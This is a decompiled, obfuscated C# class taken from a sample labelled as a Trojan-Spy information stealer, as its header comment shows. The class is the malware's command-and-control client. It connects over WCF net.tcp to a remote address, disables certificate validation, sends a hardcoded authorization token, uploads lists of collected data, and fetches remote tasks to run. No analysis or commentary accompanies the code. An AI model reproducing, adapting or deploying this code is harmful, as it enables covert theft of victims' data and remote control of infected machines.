// Decompiled with JetBrains decompiler
// Type: dnlibDotNetTypeDefMDMethodOverrideTokensy
// Assembly: Pursuits, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5AE29391-E6B0-4A11-8563-A9AF244B152D
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan-Spy.MSIL.Stealer.gen-f5d5176d0ac8a6c9093f39208d3aff397cce06017bbf0f2e4fee86a5ce09a398.exe

using System;
using System.Collections.Generic;
using System.ServiceModel;
using System.ServiceModel.Channels;
using System.ServiceModel.Security;

public class dnlibDotNetTypeDefMDMethodOverrideTokensy
{
  public SystemNetCacheRequestCacheEntryf connector;

  public bool Id1(string address) => this.RequestConnection(address) && this.Id3();

  public bool RequestConnection(string address)
  {
    try
    {
      ChannelFactory<SystemNetCacheRequestCacheEntryf> channelFactory = new ChannelFactory<SystemNetCacheRequestCacheEntryf>(SystemCollectionsGenericSortedSetEqualityComparers.CreateBind(), new EndpointAddress(new Uri("net.tcp://" + address + "/"), EndpointIdentity.CreateDnsIdentity("localhost"), new AddressHeader[0]));
      channelFactory.Credentials.ServiceCertificate.Authentication.CertificateValidationMode = X509CertificateValidationMode.None;
      IContextChannel channel = channelFactory.CreateChannel() as IContextChannel;
      this.connector = channel as SystemNetCacheRequestCacheEntryf;
      OperationContextScope operationContextScope = new OperationContextScope(channel);
      OperationContext.Current.OutgoingMessageHeaders.Add(MessageHeader.CreateHeader("Authorization", "ns1", (object) "34bb978ec3dd4134ac25d29f42e3b5f1"));
      return true;
    }
    catch (Exception ex)
    {
      return false;
    }
  }

  public bool Id3()
  {
    try
    {
      return this.connector.Id1();
    }
    catch (Exception ex)
    {
      return false;
    }
  }

  public bool Id4(SystemMediaSoundPlayerp result)
  {
    try
    {
      this.connector.Id3(result);
      return true;
    }
    catch (Exception ex)
    {
      return false;
    }
  }

  public bool Id5(out dnlibDotNetWriterTablesHeapRawDummyRowU args)
  {
    try
    {
      args = new dnlibDotNetWriterTablesHeapRawDummyRowU();
      args = this.connector.Id2();
      return true;
    }
    catch (Exception ex)
    {
      args = new dnlibDotNetWriterTablesHeapRawDummyRowU();
      return false;
    }
  }

  public SystemNetWinHttpWebProxyFinderp Id6(
    SystemMediaSoundPlayerp result)
  {
    try
    {
      return this.connector.Id4(result);
    }
    catch (Exception ex)
    {
      return SystemNetWinHttpWebProxyFinderp.Id1;
    }
  }

  public SystemNetWinHttpWebProxyFinderp Id7(byte[] result)
  {
    try
    {
      return this.connector.Id5(result);
    }
    catch (Exception ex)
    {
      return SystemNetWinHttpWebProxyFinderp.Id1;
    }
  }

  public SystemNetWinHttpWebProxyFinderp Id8(
    List<SystemCodeDomCodeRegionDirectiveQ> result)
  {
    try
    {
      return this.connector.Id11(result);
    }
    catch (Exception ex)
    {
      return SystemNetWinHttpWebProxyFinderp.Id1;
    }
  }

  public SystemNetWinHttpWebProxyFinderp Id9(
    List<SystemNetConfigurationMailSettingsSectionGroupg> result)
  {
    try
    {
      return this.connector.Id15(result);
    }
    catch (Exception ex)
    {
      return SystemNetWinHttpWebProxyFinderp.Id1;
    }
  }

  public SystemNetWinHttpWebProxyFinderp Id10(List<string> result)
  {
    try
    {
      return this.connector.Id6(result);
    }
    catch (Exception ex)
    {
      return SystemNetWinHttpWebProxyFinderp.Id1;
    }
  }

  public SystemNetWinHttpWebProxyFinderp Id11(
    List<SystemNetConfigurationMailSettingsSectionGroupg> result)
  {
    try
    {
      return this.connector.Id21(result);
    }
    catch (Exception ex)
    {
      return SystemNetWinHttpWebProxyFinderp.Id1;
    }
  }

  public SystemNetWinHttpWebProxyFinderp Id12(
    List<SystemComponentModelCultureInfoConverterb> result)
  {
    try
    {
      return this.connector.Id12(result);
    }
    catch (Exception ex)
    {
      return SystemNetWinHttpWebProxyFinderp.Id1;
    }
  }

  public SystemNetWinHttpWebProxyFinderp Id13(
    List<SystemNetSocketsNetworkStreamb> result)
  {
    try
    {
      return this.connector.Id10(result);
    }
    catch (Exception ex)
    {
      return SystemNetWinHttpWebProxyFinderp.Id1;
    }
  }

  public SystemNetWinHttpWebProxyFinderp Id14(
    List<SystemNetSafeFreeCredentialSECURITYl> result)
  {
    try
    {
      return this.connector.Id13(result);
    }
    catch (Exception ex)
    {
      return SystemNetWinHttpWebProxyFinderp.Id1;
    }
  }

  public SystemNetWinHttpWebProxyFinderp Id15(List<string> result)
  {
    try
    {
      return this.connector.Id8(result);
    }
    catch (Exception ex)
    {
      return SystemNetWinHttpWebProxyFinderp.Id1;
    }
  }

  public SystemNetWinHttpWebProxyFinderp Id16(List<string> result)
  {
    try
    {
      return this.connector.Id7(result);
    }
    catch (Exception ex)
    {
      return SystemNetWinHttpWebProxyFinderp.Id1;
    }
  }

  public SystemNetWinHttpWebProxyFinderp Id18(
    List<SystemComponentModelCultureInfoConverterb> result)
  {
    try
    {
      return this.connector.Id17(result);
    }
    catch (Exception ex)
    {
      return SystemNetWinHttpWebProxyFinderp.Id1;
    }
  }

  public SystemNetWinHttpWebProxyFinderp Id19(
    List<SystemNetConfigurationMailSettingsSectionGroupg> result)
  {
    try
    {
      return this.connector.Id18(result);
    }
    catch (Exception ex)
    {
      return SystemNetWinHttpWebProxyFinderp.Id1;
    }
  }

  public SystemNetWinHttpWebProxyFinderp Id20(List<string> result)
  {
    try
    {
      return this.connector.Id9(result);
    }
    catch (Exception ex)
    {
      return SystemNetWinHttpWebProxyFinderp.Id1;
    }
  }

  public SystemNetWinHttpWebProxyFinderp Id21(
    List<SystemNetConfigurationMailSettingsSectionGroupg> result)
  {
    try
    {
      return this.connector.Id19(result);
    }
    catch (Exception ex)
    {
      return SystemNetWinHttpWebProxyFinderp.Id1;
    }
  }

  public SystemNetWinHttpWebProxyFinderp Id22(
    List<SystemNetConfigurationMailSettingsSectionGroupg> result)
  {
    try
    {
      return this.connector.Id14(result);
    }
    catch (Exception ex)
    {
      return SystemNetWinHttpWebProxyFinderp.Id1;
    }
  }

  public SystemNetWinHttpWebProxyFinderp Id23(
    List<SystemNetConfigurationMailSettingsSectionGroupg> result)
  {
    try
    {
      return this.connector.Id16(result);
    }
    catch (Exception ex)
    {
      return SystemNetWinHttpWebProxyFinderp.Id1;
    }
  }

  public SystemNetWinHttpWebProxyFinderp Id24(
    List<SystemNetConfigurationMailSettingsSectionGroupg> result)
  {
    try
    {
      return this.connector.Id20(result);
    }
    catch (Exception ex)
    {
      return SystemNetWinHttpWebProxyFinderp.Id1;
    }
  }

  public bool Id25()
  {
    try
    {
      this.connector.Id22();
      return true;
    }
    catch (Exception ex)
    {
      return false;
    }
  }

  public bool Id26(
    SystemMediaSoundPlayerp user,
    out IList<SystemSecurityCryptographyXCertificatesXEnhancedKeyUsageExtensionU> remoteTasks)
  {
    try
    {
      remoteTasks = this.connector.Id23(user);
      return true;
    }
    catch (Exception ex)
    {
      remoteTasks = (IList<SystemSecurityCryptographyXCertificatesXEnhancedKeyUsageExtensionU>) new List<SystemSecurityCryptographyXCertificatesXEnhancedKeyUsageExtensionU>();
      return false;
    }
  }

  public bool Id27(SystemMediaSoundPlayerp user, int taskId)
  {
    try
    {
      this.connector.Id24(user, taskId);
      return true;
    }
    catch (Exception ex)
    {
      return false;
    }
  }
}
